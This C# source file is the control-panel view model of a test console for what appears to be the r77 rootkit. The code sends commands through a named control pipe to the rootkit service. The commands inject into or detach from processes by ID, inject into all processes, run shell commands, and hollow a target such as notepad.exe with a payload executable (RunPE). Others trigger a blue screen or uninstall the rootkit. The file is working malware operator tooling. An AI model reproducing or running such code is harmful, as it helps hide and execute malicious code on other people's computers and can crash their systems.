using BytecodeApi.Extensions;
using BytecodeApi.Threading;
using BytecodeApi.UI;
using BytecodeApi.UI.Data;
using BytecodeApi.UI.Dialogs;
using System;
using System.IO;
using System.Linq;
using System.Threading;

namespace TestConsole
{
	public sealed class ControlPipeUserControlViewModel : ObservableObject
	{
		public static ControlPipeUserControlViewModel Singleton { get; private set; }
		public ControlPipeUserControl View { get; set; }

		private DelegateCommand _RunPEPayloadPathBrowseCommand;
		private DelegateCommand<ControlCode> _ExecuteCommand;
		public DelegateCommand RunPEPayloadPathBrowseCommand => _RunPEPayloadPathBrowseCommand ?? (_RunPEPayloadPathBrowseCommand = new DelegateCommand(RunPEPayloadPathBrowseCommand_Execute));
		public DelegateCommand<ControlCode> ExecuteCommand => _ExecuteCommand ?? (_ExecuteCommand = new DelegateCommand<ControlCode>(ExecuteCommand_Execute));

		private string _InjectProcessId;
		private string _DetachProcessId;
		private string _ShellExecPath;
		private string _ShellExecCommandLine;
		private string _RunPETargetPath;
		private string _RunPEPayloadPath;
		public string InjectProcessId
		{
			get => _InjectProcessId;
			set => Set(ref _InjectProcessId, value);
		}
		public string DetachProcessId
		{
			get => _DetachProcessId;
			set => Set(ref _DetachProcessId, value);
		}
		public string ShellExecPath
		{
			get => _ShellExecPath;
			set => Set(ref _ShellExecPath, value);
		}
		public string ShellExecCommandLine
		{
			get => _ShellExecCommandLine;
			set => Set(ref _ShellExecCommandLine, value);
		}
		public string RunPETargetPath
		{
			get => _RunPETargetPath;
			set => Set(ref _RunPETargetPath, value);
		}
		public string RunPEPayloadPath
		{
			get => _RunPEPayloadPath;
			set => Set(ref _RunPEPayloadPath, value);
		}
		public bool IsR77ServiceRunning => ProcessesUserControlViewModel.Singleton.Processes.Any(process => process.IsR77Service || process.Name == "dllhost.exe" && process.IsHiddenById);

		public ControlPipeUserControlViewModel(ControlPipeUserControl view)
		{
			Singleton = this;
			View = view;

			RunPETargetPath = @"C:\Windows\System32\notepad.exe";
		}

		public void BeginUpdate()
		{
			ThreadFactory.StartThread(() =>
			{
				while (true)
				{
					View.Dispatch(() => RaisePropertyChanged(nameof(IsR77ServiceRunning)));
					Thread.Sleep(1000);
				}
			});
		}

		private void RunPEPayloadPathBrowseCommand_Execute()
		{
			if (FileDialogs.Open("exe") is string path)
			{
				RunPEPayloadPath = path;
			}
		}
		private void ExecuteCommand_Execute(ControlCode parameter)
		{
			try
			{
				switch (parameter)
				{
					case ControlCode.R77TerminateService:
						Log.Write(ControlPipe.Write(parameter).ToArray());
						break;
					case ControlCode.R77Uninstall:
						Log.Write(ControlPipe.Write(parameter).ToArray());
						break;
					case ControlCode.R77PauseInjection:
						Log.Write(ControlPipe.Write(parameter).ToArray());
						break;
					case ControlCode.R77ResumeInjection:
						Log.Write(ControlPipe.Write(parameter).ToArray());
						break;
					case ControlCode.ProcessesInject:
						{
							if (InjectProcessId.IsNullOrWhiteSpace())
							{
								Log.Write(new LogMessage
								(
									LogMessageType.Error,
									new LogFileItem(parameter.GetDescription()),
									new LogTextItem("Specify a process ID.")
								));
							}
							else if (InjectProcessId.ToInt32OrNull() is int processId)
							{
								Log.Write(ControlPipe.Write(parameter, BitConverter.GetBytes(processId), InjectProcessId).ToArray());
							}
							else
							{
								Log.Write(new LogMessage
								(
									LogMessageType.Error,
									new LogFileItem(parameter.GetDescription()),
									new LogTextItem("Invalid process ID:"),
									new LogDetailsItem(InjectProcessId)
								));
							}
						}
						break;
					case ControlCode.ProcessesInjectAll:
						Log.Write(ControlPipe.Write(parameter).ToArray());
						break;
					case ControlCode.ProcessesDetach:
						{
							if (DetachProcessId.IsNullOrWhiteSpace())
							{
								Log.Write(new LogMessage
								(
									LogMessageType.Error,
									new LogFileItem(parameter.GetDescription()),
									new LogTextItem("Specify a process ID.")
								));
							}
							else if (DetachProcessId.ToInt32OrNull() is int processId)
							{
								Log.Write(ControlPipe.Write(parameter, BitConverter.GetBytes(processId), DetachProcessId).ToArray());
							}
							else
							{
								Log.Write(new LogMessage
								(
									LogMessageType.Error,
									new LogFileItem(parameter.GetDescription()),
									new LogTextItem("Invalid process ID:"),
									new LogDetailsItem(DetachProcessId)
								));
							}
						}
						break;
					case ControlCode.ProcessesDetachAll:
						Log.Write(ControlPipe.Write(parameter).ToArray());
						break;
					case ControlCode.UserShellExec:
						ShellExecPath = ShellExecPath?.Trim().ToNullIfEmpty();
						ShellExecCommandLine = ShellExecCommandLine?.Trim().ToNullIfEmpty();

						if (ShellExecPath == null)
						{
							Log.Write(new LogMessage
							(
								LogMessageType.Error,
								new LogFileItem(parameter.GetDescription()),
								new LogTextItem("Specify a path.")
							));
						}
						else
						{
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (BinaryWriter writer = new BinaryWriter(memoryStream))
								{
									writer.Write(ShellExecPath.ToUnicodeBytes());
									writer.Write((short)0);
									if (ShellExecCommandLine != null) writer.Write(ShellExecCommandLine.ToUnicodeBytes());
									writer.Write((short)0);
								}

								Log.Write(ControlPipe.Write(parameter, memoryStream.ToArray(), ShellExecPath + (ShellExecCommandLine == null ? null : " " + ShellExecCommandLine)).ToArray());
							}
						}
						break;
					case ControlCode.UserRunPE:
						RunPETargetPath = RunPETargetPath?.Trim().ToNullIfEmpty();
						RunPEPayloadPath = RunPEPayloadPath?.Trim().ToNullIfEmpty();

						if (RunPETargetPath == null)
						{
							Log.Write(new LogMessage
							(
								LogMessageType.Error,
								new LogFileItem(parameter.GetDescription()),
								new LogTextItem("Specify a target path.")
							));
						}
						else if (RunPEPayloadPath == null)
						{
							Log.Write(new LogMessage
							(
								LogMessageType.Error,
								new LogFileItem(parameter.GetDescription()),
								new LogTextItem("Specify a payload.")
							));
						}
						else if (!File.Exists(RunPETargetPath))
						{
							Log.Write(new LogMessage
							(
								LogMessageType.Error,
								new LogTextItem("File"),
								new LogFileItem(Path.GetFileName(RunPETargetPath)),
								new LogTextItem("not found.")
							));
						}
						else if (!File.Exists(RunPEPayloadPath))
						{
							Log.Write(new LogMessage
							(
								LogMessageType.Error,
								new LogTextItem("File"),
								new LogFileItem(Path.GetFileName(RunPEPayloadPath)),
								new LogTextItem("not found.")
							));
						}
						else
						{
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (BinaryWriter writer = new BinaryWriter(memoryStream))
								{
									writer.Write(RunPETargetPath.ToUnicodeBytes());
									writer.Write((short)0);
									writer.Write((int)new FileInfo(RunPEPayloadPath).Length);
									writer.Write(File.ReadAllBytes(RunPEPayloadPath));
								}

								Log.Write(ControlPipe.Write(parameter, memoryStream.ToArray(), Path.GetFileName(RunPEPayloadPath) + " -> " + Path.GetFileName(RunPETargetPath)).ToArray());
							}
						}
						break;
					case ControlCode.SystemBsod:
						if (MessageBoxes.Confirmation("WARNING: This will trigger a blue screen.\r\nContinue?", true) == true)
						{
							Log.Write(ControlPipe.Write(parameter).ToArray());
						}
						break;
					default:
						throw new ArgumentException();
				}
			}
			catch (Exception ex)
			{
				Log.Write(new LogMessage
				(
					LogMessageType.Error,
					new LogTextItem("Sending command to control pipe failed."),
					new LogDetailsItem($"Error Details: {ex.Message}")
				));
			}
		}
	}
}